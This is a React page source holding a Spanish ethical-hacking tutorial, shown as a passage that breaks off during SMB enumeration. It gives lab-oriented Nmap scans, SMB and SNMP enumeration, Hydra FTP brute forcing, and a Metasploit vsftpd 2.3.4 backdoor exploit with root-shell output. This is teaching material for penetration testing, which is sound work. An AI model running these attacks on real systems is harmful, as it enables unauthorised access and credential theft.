import ReactMarkdown from "react-markdown"
import remarkGfm from "remark-gfm"
import CodeBlockWithCopy from "../components/CodeBlockWithCopy" // Import the new component
import React from "react" // Import React for Children.toArray
import TableOfContents from "../components/TableOfContents" // Import the new TableOfContents component

// Helper function to slugify text for IDs
const slugify = (text: string) => {
  return text
    .toString()
    .normalize("NFD")
    .replace(/[\u0300-\u036f]/g, "")
    .toLowerCase()
    .trim()
    .replace(/\s+/g, "-")
    .replace(/[^\w-]+/g, "")
    .replace(/--+/g, "-")
}

// Define the structure of your Table of Contents based on the content
const tocItems = [
  {
    level: 2,
    text: "Fase 1: Instalación de la Virtual Machine",
    id: slugify("Fase 1: Instalación de la Virtual Machine"),
    children: [
      {
        level: 3,
        text: "Configuración de tu Entorno de Laboratorio",
        id: slugify("Configuración de tu Entorno de Laboratorio"),
      },
    ],
  },
  {
    level: 2,
    text: "Fase 2: Comandos en Kali Linux",
    id: slugify("Fase 2: Comandos en Kali Linux"),
    children: [
      { level: 3, text: "Dominando la Terminal de Kali Linux", id: slugify("Dominando la Terminal de Kali Linux") },
    ],
  },
  {
    level: 2,
    text: "Fase 3: Escaneo de Red y Reconocimiento (Nmap)",
    id: slugify("Fase 3: Escaneo de Red y Reconocimiento (Nmap)"),
    children: [
      {
        level: 3,
        text: "Netdiscover: Descubrimiento de Hosts en Redes Locales",
        id: slugify("Netdiscover: Descubrimiento de Hosts en Redes Locales"),
      },
      {
        level: 3,
        text: "Nmap: El Escáner de Red Definitivo",
        id: slugify("Nmap: El Escáner de Red Definitivo"),
        children: [
          { level: 4, text: "Encontrando nuevos hosts", id: slugify("Encontrando nuevos hosts") },
          {
            level: 4,
            text: "Ping Sweep (en versiones recientes es -sn)",
            id: slugify("Ping Sweep (en versiones recientes es -sn)"),
          },
          { level: 4, text: "ARP Scan: Escaneo en Redes Locales", id: slugify("ARP Scan: Escaneo en Redes Locales") },
          { level: 4, text: "sC (Escaneo con Scripts .NSE)", id: slugify("sC (Escaneo con Scripts .NSE)") },
          { level: 4, text: "sV (Detección de Versiones)", id: slugify("sV (Detección de Versiones)") },
          { level: 4, text: "Escaneo de SMB con Nmap", id: slugify("Escaneo de SMB con Nmap") },
        ],
      },
      {
        level: 3,
        text: "Wireshark: Análisis de Tráfico",
        id: slugify("Wireshark: Análisis de Tráfico"),
        children: [
          { level: 4, text: "Ver paquetes y seguir flujos", id: slugify("Ver paquetes y seguir flujos") },
          { level: 4, text: "Obtener métodos POST y GET", id: slugify("Obtener métodos POST y GET") },
          { level: 4, text: "Exportar archivos de la captura", id: slugify("Exportar archivos de la captura") },
          {
            level: 4,
            text: "Análisis de archivos embebidos con Binwalk",
            id: slugify("Análisis de archivos embebidos con Binwalk"),
          },
          { level: 4, text: "Filtros comunes en Wireshark", id: slugify("Filtros comunes en Wireshark") },
          {
            level: 4,
            text: "Port Login: Pruebas de Acceso Inicial",
            id: slugify("Port Login: Pruebas de Acceso Inicial"),
          },
        ],
      },
    ],
  },
  {
    level: 2,
    text: "Fase 4: Fuzzing",
    id: slugify("Fase 4: Fuzzing"),
    children: [{ level: 3, text: "Introducción al Fuzzing", id: slugify("Introducción al Fuzzing") }],
  },
  {
    level: 2,
    text: "Fase 5: Hydra y Enumeración Avanzada",
    id: slugify("Fase 5: Hydra y Enumeración Avanzada"),
    children: [
      { level: 3, text: "Enumeración y Explotación de FTP", id: slugify("Enumeración y Explotación de FTP") },
      { level: 3, text: "Enumeración SNMP", id: slugify("Enumeración SNMP") },
      { level: 3, text: "Enumeración SMB", id: slugify("Enumeración SMB") },
      { level: 3, text: "RDP (Remote Desktop Protocol)", id: slugify("RDP (Remote Desktop Protocol)") },
      { level: 3, text: "NetBIOS", id: slugify("NetBIOS") },
    ],
  },
  {
    level: 2,
    text: "Fase 6: Burp Suite",
    id: slugify("Fase 6: Burp Suite"),
    children: [
      {
        level: 3,
        text: "Interceptación y Manipulación de Tráfico Web",
        id: slugify("Interceptación y Manipulación de Tráfico Web"),
      },
    ],
  },
  {
    level: 2,
    text: "Fase 7: SQLMap",
    id: slugify("Fase 7: SQLMap"),
    children: [
      { level: 3, text: "SQLi (SQL Injection) desde la web", id: slugify("SQLi (SQL Injection) desde la web") },
      { level: 3, text: "SQLi desde una petición HTTP", id: slugify("SQLi desde una petición HTTP") },
    ],
  },
  {
    level: 2,
    text: "Fase 8: Metasploit Framework",
    id: slugify("Fase 8: Metasploit Framework"),
    children: [
      {
        level: 3,
        text: "Privilege Escalation: Escalada de Privilegios",
        id: slugify("Privilege Escalation: Escalada de Privilegios"),
      },
      { level: 3, text: "Para ser Root: Métodos de Escalada", id: slugify("Para ser Root: Métodos de Escalada") },
      { level: 3, text: "Cambiar de usuario", id: slugify("Cambiar de usuario") },
    ],
  },
  {
    level: 2,
    text: "Fase 9: Postman",
    id: slugify("Fase 9: Postman"),
    children: [
      {
        level: 3,
        text: "Pruebas de Seguridad en APIs con Postman",
        id: slugify("Pruebas de Seguridad en APIs con Postman"),
      },
    ],
  },
  {
    level: 2,
    text: "Fase 10: OWASP ZAP",
    id: slugify("Fase 10: OWASP ZAP"),
    children: [
      {
        level: 3,
        text: "Escaneo de Vulnerabilidades Web con OWASP ZAP",
        id: slugify("Escaneo de Vulnerabilidades Web con OWASP ZAP"),
      },
    ],
  },
  {
    level: 2,
    text: "Fase 11: Phishing y Creación de Malware (Educativo)",
    id: slugify("Fase 11: Phishing y Creación de Malware (Educativo)"),
    children: [{ level: 3, text: "Malware Threats: ANDRORAT", id: slugify("Malware Threats: ANDRORAT") }],
  },
  {
    level: 2,
    text: "Otros Temas Relevantes en Hacking Ético",
    id: slugify("Otros Temas Relevantes en Hacking Ético"),
    children: [
      { level: 3, text: "Steganography", id: slugify("Steganography") },
      { level: 3, text: "Hashes", id: slugify("Hashes") },
      { level: 3, text: "Cryptography", id: slugify("Cryptography") },
      { level: 3, text: "Hacking Android", id: slugify("Hacking Android") },
    ],
  },
]

// Custom renderer for Markdown elements to apply professional styling and copy functionality
const components = {
  pre: ({ node, children }) => {
    const codeElement = React.Children.toArray(children)[0] as React.ReactElement | undefined

    if (
      codeElement &&
      codeElement.type === "code" &&
      typeof codeElement.props.className === "string" &&
      codeElement.props.className.startsWith("language-")
    ) {
      const language = codeElement.props.className.replace("language-", "")
      const codeContent = String(codeElement.props.children).trim()
      return <CodeBlockWithCopy language={language}>{codeContent}</CodeBlockWithCopy>
    } else {
      return (
        <pre className="bg-gray-800 text-gray-200 p-4 rounded-lg my-6 overflow-x-auto shadow-inner">{children}</pre>
      )
    }
  },
  code: ({ className, children, ...props }) => {
    const match = /language-(\w+)/.exec(className || "")
    return match ? (
      <code className="font-mono text-sm" {...props}>
        {children}
      </code>
    ) : (
      <code className="bg-gray-700 text-gray-100 px-1 py-0.5 rounded font-mono text-sm" {...props}>
        {children}
      </code>
    )
  },
  p: ({ children }) => <p className="mb-4 text-lg leading-relaxed text-foreground">{children}</p>,
  li: ({ children }) => <li className="mb-2 text-lg leading-relaxed text-foreground">{children}</li>,
  h1: ({ children }) => (
    <h1 id={slugify(String(children))} className="text-5xl font-bold mb-8 text-foreground">
      {children}
    </h1>
  ),
  h2: ({ children }) => (
    <h2
      id={slugify(String(children))}
      className="text-4xl font-bold mb-6 text-foreground mt-10 border-b border-primary/20 pb-2"
    >
      {children}
    </h2>
  ),
  h3: ({ children }) => (
    <h3 id={slugify(String(children))} className="text-3xl font-semibold mb-4 text-foreground mt-8">
      {children}
    </h3>
  ),
  h4: ({ children }) => (
    <h4 id={slugify(String(children))} className="text-2xl font-medium mb-3 text-foreground mt-6">
      {children}
    </h4>
  ),
  blockquote: ({ children }) => (
    <blockquote className="border-l-4 border-primary pl-4 italic text-muted-foreground my-6">{children}</blockquote>
  ),
}

const redTeamContent = `
> **¡Bienvenido a la Masterclass de Introducción al Hacking Ético!**
> Esta guía está diseñada para proporcionarte una base sólida y práctica en ciberseguridad ofensiva, siguiendo un camino progresivo desde la configuración de tu entorno hasta técnicas avanzadas. ¡Prepárate para aprender y practicar!

## Fase 1: Instalación de la Virtual Machine
El primer paso para cualquier aspirante a hacker ético es configurar un entorno de laboratorio seguro. Esto te permitirá practicar técnicas sin afectar tu sistema principal.

### Configuración de tu Entorno de Laboratorio
Aprenderás a instalar y configurar máquinas virtuales utilizando software como VirtualBox o VMware. Es crucial tener sistemas operativos como Kali Linux (para tus herramientas de ataque) y Windows (como objetivo de prueba) listos para tus prácticas de ciberseguridad.

\`\`\`text
[Aquí se incluirían los pasos detallados para la instalación de VirtualBox/VMware y la configuración de Kali Linux y Windows como máquinas virtuales. Por ejemplo:
1. Descargar VirtualBox/VMware Workstation Player.
2. Descargar la ISO de Kali Linux y Windows.
3. Crear una nueva máquina virtual, asignando recursos (RAM, CPU, disco).
4. Instalar el sistema operativo en la máquina virtual.
5. Configurar la red de las máquinas virtuales (modo NAT, red interna, etc.).]
\`\`\`

## Fase 2: Comandos en Kali Linux
Kali Linux es la distribución de Linux preferida por los profesionales de la ciberseguridad. Dominar su terminal y sus comandos es fundamental para cualquier operación de hacking ético.

### Dominando la Terminal de Kali Linux
Explora los comandos esenciales de Kali Linux, desde la navegación de archivos y la gestión de permisos hasta la manipulación de procesos. Estos son los cimientos sobre los que construirás tus habilidades.

\`\`\`bash
# Comandos básicos de navegación
ls -la        # Listar archivos y directorios con detalles
cd /path/to/dir # Cambiar de directorio
pwd           # Mostrar el directorio actual

# Comandos de manipulación de archivos
cat file.txt  # Mostrar contenido de un archivo
echo "Hello" > file.txt # Escribir texto en un archivo (sobrescribe)
echo "World" >> file.txt # Añadir texto a un archivo (añade)
cp source dest # Copiar archivos
mv old_name new_name # Mover o renombrar archivos
rm file.txt   # Eliminar archivo
mkdir new_dir # Crear directorio

# Comandos de permisos
chmod 755 script.sh # Cambiar permisos (rwx r-x r-x)
chown user:group file # Cambiar propietario y grupo

# Comandos de red básicos
ifconfig      # Mostrar configuración de interfaces de red (o ip a)
ping google.com # Enviar paquetes ICMP a un host
netstat -tulnp # Mostrar conexiones de red y puertos abiertos
\`\`\`

## Fase 3: Escaneo de Red y Reconocimiento (Nmap)
En esta fase, aprenderás a identificar dispositivos activos y servicios en una red. Es el primer paso crucial para entender el entorno de tu objetivo.

### Netdiscover: Descubrimiento de Hosts en Redes Locales
Netdiscover es una herramienta activa/pasiva de reconocimiento de red diseñada para descubrir hosts en redes que utilizan ARP. Es especialmente útil en redes locales para mapear la topología y encontrar dispositivos conectados.

Para escanear tu red local y descubrir hosts activos, usa el siguiente comando, reemplazando \`eth0\` con tu interfaz de red y el rango IP con el de tu red (ej. \`192.168.1.0/24\`):
\`\`\`bash
sudo netdiscover -i eth0 -r 192.168.146.0/24
\`\`\`

### Nmap: El Escáner de Red Definitivo
Nmap (Network Mapper) es una utilidad gratuita y de código abierto para la exploración de red y auditorías de seguridad. Es una de las herramientas más potentes y versátiles para el escaneo de puertos y el descubrimiento de servicios.

#### Encontrando nuevos hosts
Para identificar todos los hosts activos en un rango de IP específico, puedes usar el siguiente comando. Recuerda reemplazar \`AAAAA\` con el segmento de tu red (ej. \`192.168.1.*\`):
\`\`\`bash
nmap 192.168.AAAAA.*
\`\`\`

*Output (Ejemplo de un escaneo de hosts):*
\`\`\`bash
Nmap scan report for 192.168.146.1
Host is up (0.0011s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE
2968/tcp open  enpp
MAC Address: 00:50:56:C0:00:08 (VMware)
\`\`\`

#### Ping Sweep (en versiones recientes es -sn)
El **ping sweep** en \`nmap\` es una técnica de escaneo utilizada para determinar qué hosts están activos en una red. En lugar de realizar un escaneo de puertos completo, un ping sweep envía solicitudes de ping (ICMP Echo Requests) o utiliza otros métodos para identificar qué dispositivos están respondiendo.
\`\`\`bash
nmap -sP 192.168.AAAAA.*
\`\`\`

*Output (Ejemplo de un ping sweep):*
\`\`\`bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-23 13:19 EDT
Nmap scan report for 192.168.146.1
Host is up (0.0015s latency).
MAC Address: 00:50:56:C0:00:08 (VMware)
Nmap scan report for 192.168.146.2
Host is up (0.00024s latency).
MAC Address: 00:50:56:E0:9C:DB (VMware)
Nmap scan report for 192.168.146.130
Host is up (0.0014s latency).
MAC Address: 00:0C:29:80:CB:37 (VMware)
Nmap scan report for 192.168.146.254
Host is up (0.00038s latency).
MAC Address: 00:50:56:E2:97:85 (VMware)
Nmap scan report for 192.168.146.159
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 1.75 seconds
\`\`\`

#### ARP Scan: Escaneo en Redes Locales
Este tipo de escaneo es muy efectivo en redes locales, ya que no puede ser bloqueado por firewalls al ser esencial para la comunicación de red.
\`\`\`bash
nmap -PR -sn 192.168.1.0/24
\`\`\`

*Output (Ejemplo de un escaneo ARP):*
\`\`\`bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-23 13:25 EDT
Nmap scan report for 192.168.146.1
Host is up (0.00069s latency).
MAC Address: 00:50:56:C0:00:08 (VMware)
Nmap scan report for 192.168.146.2
Host is up (0.00033s latency).
MAC Address: 00:50:56:E0:9C:DB (VMware)
Nmap scan report for 192.168.146.130
Host is up (0.0017s latency).
MAC Address: 00:0C:29:80:CB:37 (VMware)
Nmap scan report for 192.168.146.254
Host is up (0.00039s latency).
MAC Address: 00:50:56:E2:97:85 (VMware)
Nmap scan report for 192.168.146.159
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 1.72 seconds
\`\`\`

#### sC (Escaneo con Scripts .NSE)
La opción \`-sC\` le indica a \`nmap\` que ejecute los scripts predeterminados del motor de scripts de \`nmap\` (NSE - Nmap Scripting Engine). Estos scripts realizan una variedad de tareas, como:
*   Detección de servicios.
*   Identificación de versiones de software.
*   Búsqueda de vulnerabilidades comunes.
*   Recolección de información adicional sobre los hosts y servicios.

#### sV (Detección de Versiones)
La opción \`-sV\` activa la detección de versiones de servicios, que intenta determinar los detalles específicos sobre los servicios que están escuchando en los puertos abiertos. Esto incluye:
*   Nombre del servicio.
*   Versión exacta del software del servicio.
*   Información adicional, como el sistema operativo subyacente, cuando es posible.

#### Escaneo de SMB con Nmap
Para escanear servicios SMB (Server Message Block) y buscar vulnerabilidades, puedes usar el siguiente comando:
\`\`\`bash
nmap --script smb-os-discovery,smb-enum-shares,smb-enum-users,smb-vuln-ms17-010 -p 445 192.168.1.100
\`\`\`
*Output (Ejemplo de escaneo SMB):*
\`\`\`bash
Starting Nmap 7.80 ( https://nmap.org ) at 2024-07-22 12:34 PDT
Nmap scan report for 192.168.1.100
Host is up (0.0012s latency).
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: TARGET-PC
|   NetBIOS computer name: TARGET-PC\\x00
|   Workgroup: WORKGROUP\\x00
|_  System time: 2024-07-22T19:34:50+00:00
| smb-enum-shares:
|   ACCOUNTING
|   Documents
|   IPC$
|_  Public
| smb-enum-users:
|   TARGET-PC\\Administrator
|   TARGET-PC\\Guest
|   TARGET-PC\\John
|_  TARGET-PC\\Jane
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|_    Risk factor: HIGH

Nmap done: 1 IP address (1 host up) scanned in 20.34 seconds
\`\`\`

### Wireshark: Análisis de Tráfico
Wireshark es un analizador de protocolos de red que te permite capturar y examinar el tráfico de datos que pasa por tu red. Es fundamental para entender cómo se comunican los sistemas y detectar anomalías.

#### Ver paquetes y seguir flujos
Para seguir una conversación TCP específica, selecciona un paquete en Wireshark y usa la opción de menú:
\`\`\`text
select_packet > follow > TCP Stream
\`\`\`

#### Obtener métodos POST y GET
Puedes filtrar el tráfico HTTP para ver solo las peticiones POST o GET, lo cual es útil para identificar envíos de formularios o solicitudes de datos:
\`\`\`text
http.request.method==post
http.request.method==get
\`\`\`

#### Exportar archivos de la captura
Para extraer archivos que han sido transferidos a través de protocolos como FTP dentro de una captura de Wireshark:
\`\`\`text
File > Export Objets > FTP-DATA (o el que escojamos)
\`\`\`

#### Análisis de archivos embebidos con Binwalk
Si encuentras un archivo que podría contener otros archivos ocultos (como imágenes con datos esteganográficos), Binwalk es tu herramienta para analizarlos y extraerlos.
\`\`\`bash
# Instalar Binwalk (si no lo tienes)
sudo apt-get install binwalk

# Analizar el archivo sospechoso (ej. flag.jpg)
binwalk flag.jpg

# Salida esperada de binwalk mostrando la ubicación del archivo .png embebido:
# DECIMAL       HEXADECIMAL     DESCRIPTION
# --------------------------------------------------------------------------------
# 0             0x0             JPEG image data, JFIF standard 1.01
# 123456        0x1E240         PNG image data, 600 x 400, 8-bit/color RGB, non-interlaced

# Extraer el archivo embebido
binwalk -e flag.jpg

# Navegar al directorio extraído y listar los archivos
cd _flag.jpg.extracted
ls

# Salida esperada:
# 1E240.png
\`\`\`

#### Filtros comunes en Wireshark
Un filtro común para ver paquetes SYN en un handshake TCP (útil para identificar inicios de conexión):
\`\`\`text
tcp.flags.syn==1
\`\`\`

#### Port Login: Pruebas de Acceso Inicial
Estos comandos te permiten intentar iniciar sesión en diferentes servicios de red directamente desde la terminal.

##### FTP Login:
\`\`\`bash
ftp x.x.x.x
\`\`\`

##### SSH Login:
\`\`\`bash
ssh username@x.x.x.x
\`\`\`

##### Telnet Login:
\`\`\`bash
telnet x.x.x.x
\`\`\`

## Fase 4: Fuzzing
El Fuzzing es una técnica de prueba de software automatizada que implica inyectar datos inválidos, inesperados o aleatorios (fuzz) en una aplicación para descubrir fallos de seguridad, como caídas, aserciones fallidas o fugas de memoria. Es una técnica poderosa para encontrar vulnerabilidades no obvias.

### Introducción al Fuzzing
\`\`\`text
[Aquí se incluiría una descripción más detallada de qué es el fuzzing, por qué es importante, y ejemplos de herramientas o metodologías comunes como AFL, Peach Fuzzer, o Burp Suite Intruder para fuzzing web. Podrías añadir un ejemplo conceptual de cómo se "fuzzea" una entrada.]
\`\`\`

## Fase 5: Hydra y Enumeración Avanzada
Esta fase profundiza en la enumeración de servicios y la realización de ataques de fuerza bruta para obtener credenciales, utilizando herramientas como Hydra y Metasploit.

### Enumeración y Explotación de FTP
#### Método 1 (Metasploit Framework): Explotación de Vulnerabilidades FTP
Usamos Nmap para identificar vulnerabilidades en el servicio FTP. Si encuentras una vulnerabilidad conocida, Metasploit puede ayudarte a explotarla para obtener acceso.
\`\`\`bash
sudo nmap -T5 -p21 --script vuln,vulners --open 192.168.146.130
\`\`\`

Una vez hallamos identificado una vulnerabilidad (ej. VSFTPD 2.3.4 Backdoor), la buscamos en Metasploit Framework:
\`\`\`bash
sudo msfconsole

msf6 > search FTPd 2.3

Matching Modules
================

  #  Name                                  Disclosure Date  Rank       Check  Description
  -  ----                                  ---------------  ----       -----  -----------
  0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
  1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
\`\`\`
Seleccionamos el módulo de explotación (en este caso, el número 1):
\`\`\`bash
msf6 > use 1
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
\`\`\`
Configuramos el host objetivo (\`RHOSTS\`) y el puerto (\`RPORT\`, por defecto 21 para FTP):
\`\`\`bash
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.146.130
RHOSTS => 192.168.146.130
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
\`\`\`
Finalmente, ejecutamos el exploit para obtener una shell:
\`\`\`bash
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 192.168.146.130:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.146.130:21 - USER: 331 Please specify the password.
[+] 192.168.146.130:21 - Backdoor service has been spawned, handling...
[+] 192.168.146.130:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.146.159:35607 -> 192.168.146.130:6200) at 2024-07-23 15:43:16 -0400

whoami
root
\`\`\`

#### Método 2 (Hydra): Ataques de Fuerza Bruta a FTP
Hydra es una herramienta de fuerza bruta para probar contraseñas en diversos servicios de red, incluyendo FTP.

Opción 1 (usando listas de usuarios y contraseñas):
\`\`\`powershell
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt ftp://10.10.1.11
\`\`\`
Opción 2 (especificando el servicio y el host):
\`\`\`powershell
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt 192.168.146.130 ftp
\`\`\`

*Output (Ejemplo de resultado de Hydra):*
\`\`\`bash
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-07-23 17:01:36
[DATA] max 5 tasks per 1 server, overall 5 tasks, 5 login tries (l:1/p:5), ~1 try per task
[DATA] attacking ftp://192.168.146.130:21/
[21][ftp] host: 192.168.146.130   login: msfadmin   password: msfadmin
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-07-23 17:01:40
\`\`\`
Comandos útiles en una sesión FTP interactiva:
\`\`\`text
put <nombreArchivo> → Sube un archivo del local al FTP
get <nombreArchivo> → Descargar un archivo desde el servidor FTP a la computadora local.
\`\`\`

### Enumeración SNMP
SNMP (Simple Network Management Protocol) es un protocolo utilizado para gestionar dispositivos de red. La enumeración SNMP puede revelar información valiosa sobre el sistema, como nombres de dispositivos, interfaces de red, rutas, procesos en ejecución y usuarios.

#### Nmap para SNMP
Para obtener información general de SNMP de un host:
\`\`\`bash
nmap -sU -p 161 --script snmp-info,snmp-interfaces,snmp-routes,snmp-processes,snmp-users 192.168.xxx.xxx
\`\`\`

#### Encontrando Procesos en Ejecución
Para listar los procesos en ejecución a través de SNMP en un host específico:
\`\`\`bash
sudo nmap -sU -p 161 --script snmp-processes 192.168.xxx.xxx
\`\`\`

##### Lista completa de scripts SNMP
Para ver todos los scripts SNMP disponibles en Nmap y sus descripciones:
\`\`\`bash
nmap --script-help snmp-*
\`\`\`

#### Snmp-check
Snmp-check es una herramienta dedicada a la enumeración de SNMP, proporcionando un resumen estructurado de la información obtenida.
\`\`\`bash
snmp-check 192.168.xxx.xxx
\`\`\`
*Output (Ejemplo de salida de snmp-check):*
\`\`\`text
[Output of snmp-check command would appear here, showing detailed SNMP information]
\`\`\`

### Enumeración SMB
SMB (Server Message Block) es un protocolo de red para compartir archivos, impresoras y puertos serie. La enumeración SMB es crucial para descubrir recursos compartidos y usuarios.

#### Nmap para SMB
Escaneo detallado de SMB con Nmap para obtener información de versión, seguridad y NetBIOS:
\`\`\`bash
sudo nmap -T5 -sCV -A -p445 192.168.146.130
\`\`\`
*Output (Ejemplo de escaneo SMB con Nmap):*
\`\`\`bash
PORT    STATE SERVICE     VERSION
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
MAC Address: 00:0C:29:80:CB:37 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop

Host script results:
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: metasploitable
|   NetBIOS computer name:
|   Domain name: localdomain
|   FQDN: metasploitable.localdomain
|_  System time: 2024-07-23T02:03:21-04:00
|_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: mean: -23h10m58s, deviation: 2h49m42s, median: -1d01h10m58s

TRACEROUTE
HOP RTT     ADDRESS
1   2.05 ms 192.168.146.130
\`\`\`

#### Enumeración de usuarios anónimos SMB
Para verificar si el servidor SMB permite acceso anónimo:
\`\`\`bash
sudo nmap -T5 -p445 --script smb-security-mode 192.168.146.130
\`\`\`
*Output (Ejemplo de modo de seguridad SMB):*
\`\`\`bash
PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:80:CB:37 (VMware)

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
\`\`\`

#### Enumerar recursos compartidos (directorios)
Para listar los directorios compartidos en un servidor SMB:
\`\`\`bash
sudo nmap -T5 -p445 --script smb-enum-shares 192.168.146.130
\`\`\`
*Output (Ejemplo de recursos compartidos SMB):*
\`\`\`bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-24 02:48 EDT
Nmap scan report for 192.168.146.130
Host is up (0.0012s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:80:CB:37 (VMware)

Host script results:
| smb-enum-shares:
|   account_used: <blank>
|   \\\\192.168.146.130\\ADMIN$:
|     Type: STYPE_IPC
|     Comment: IPC Service (metasploitable server (Samba 3.0.20-Debian))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\\tmp
|     Anonymous access: <none>
|   \\\\192.168.146.130\\IPC$:
|     Type: STYPE_IPC
|     Comment: IPC Service (metasploitable server (Samba 3.0.20-Debian))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\\tmp
|     Anonymous access: READ/WRITE
|   \\\\192.168.146.130\\opt:
|     Type: STYPE_DISKTREE
|     Comment:
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\\tmp
|     Anonymous access: <none>
|   \\\\192.168.146.130\\print$:
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\\var\\lib\\samba\\printers
|     Anonymous access: <none>
|   \\\\192.168.146.130\\tmp:
|     Type: STYPE_DISKTREE
|     Comment: oh noes!
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\\tmp
|_    Anonymous access: READ/WRITE

Nmap done: 1 IP address (1 host up) scanned in 0.96 seconds
\`\`\`

#### Enumerar Usuarios SMB
Para listar los usuarios de un servidor SMB:
\`\`\`bash
sudo nmap -T5 -p445 --script smb-enum-users 192.168.146.130
\`\`\`
*Output (Ejemplo de usuarios SMB):*
\`\`\`bash
METASPLOITABLE\\msfadmin (RID: 3000)
|     Full name:   msfadmin,,,
|     Flags:       Normal user account
\`\`\`

#### Enumeración de sesiones SMB
\`\`\`bash
sudo nmap -T5 -p445 --script smb-enum-sessions 192.168.146.130
\`\`\`

#### Enumeración de grupos SMB
\`\`\`bash
sudo nmap -T5 -p445 --script smb-enum-groups 192.168.146.130
\`\`\`

#### Enumeración de Servicios SMB
\`\`\`bash
sudo nmap -T5 -p445 --script smb-enum-services 192.168.146.130
\`\`\`

#### Smbclient: Acceso a recursos compartidos
Smbclient es una herramienta de cliente para acceder a recursos compartidos SMB/CIFS.
\`\`\`bash
smbclient -N -L 192.168.146.130
\`\`\`
*Output (Ejemplo de listado de recursos compartidos con smbclient):*
\`\`\`bash
Anonymous login successful

  Sharename       Type      Comment
  ---------       ----      -------
  print$          Disk      Printer Drivers
  tmp             Disk      oh noes!
  opt             Disk
  IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
  ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

  Server               Comment
  ---------            -------

  Workgroup            Master
  ---------            -------
  WORKGROUP            METASPLOITABLE
\`\`\`

Para entrar a ver el directorio 'tmp' (que tiene un comentario sospechoso "oh noes!"):
\`\`\`bash
smbclient //192.168.146.130/tmp
\`\`\`
*Output (Ejemplo de listado de contenido en un recurso compartido):*
\`\`\`bash
Password for [WORKGROUP\\kali]:  [Colocar enteeeeeer, por usuario guest sin credenciales]
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \\> ls
.                                   D        0  Tue Jul 23 02:24:03 2024
..                                 DR        0  Sun May 20 14:36:12 2012
.ICE-unix                          DH        0  Sun Jul 21 21:27:54 2024
5171.jsvc_up                        R        0  Sun Jul 21 21:28:12 2024
orbit-msfadmin                     DR        0  Mon Jul 22 06:25:33 2024
.X11-unix                          DH        0  Sun Jul 21 21:28:04 2024
.X0-lock                           HR       11  Sun Jul 21 21:28:04 2024
gconfd-msfadmin                    DR        0  Mon Jul 22 06:25:33 2024

  	7282168 blocks of size 1024. 5403828 blocks available
\`\`\`

#### Rpcclient: Consultas RPC en SMB
Rpcclient es una herramienta para ejecutar comandos RPC (Remote Procedure Call) en un servidor SMB, lo que permite obtener información detallada del dominio y usuarios.
\`\`\`bash
rpcclient -U "" 192.168.146.130  #contraseña es darle en Enter por default
\`\`\`

##### Comandos importantes en rpcclient:
\`\`\`bash
srvinfo:

METASPLOITABLE Wk Sv PrQ Unx NT SNT metasploitable server (Samba 3.0.20-Debian)
	platform_id     :	500
	os version      :	4.9
	server type     :	0x9a03

-------------------------------------------------------------------------------

querydominfo:

Domain:		WORKGROUP
Server:		METASPLOITABLE
Comment:	metasploitable server (Samba 3.0.20-Debian)
Total Users:	35
Total Groups:	0
Total Aliases:	0
Sequence No:	1721716131
Force Logoff:	-1
Domain Server State:	0x1
Server Role:	ROLE_DOMAIN_PDC
Unknown 3:	0x1

